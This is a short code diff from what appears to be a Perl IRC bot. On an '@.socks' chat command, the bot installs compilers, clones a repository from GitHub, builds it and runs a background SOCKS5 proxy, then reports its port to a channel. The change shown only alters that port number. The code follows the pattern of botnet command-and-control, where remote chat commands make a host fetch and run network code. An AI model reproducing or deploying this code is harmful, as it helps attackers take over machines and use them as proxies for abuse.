@@ -63,7 +63,7 @@ $irc->on(irc_privmsg => sub {
    if ($msg =~ /@.socks/) {
   system("if [ -f /usr/bin/apt ]; then apt update && apt install build-essential -y; else yum groupinstall 'Development Tools' -y; fi;");
   system("git clone https://github.com/ind3p3nd3nt/socks && cp -r ./socks/* ./ && make -j8 && ./socks5server &");
-  $irc->write(notice => $noticechan => "[info] Socks5 Listening 0.0.0.0:8888\n");
+  $irc->write(notice => $noticechan => "[info] Socks5 Listening 0.0.0.0:1080\n");
  }
     if ($msg =~ /@.blocknoobs/) {
   system("if [ -f /usr/bin/apt ]; then apt update && apt install build-essential -y; else yum groupinstall 'Development Tools' -y; fi;");
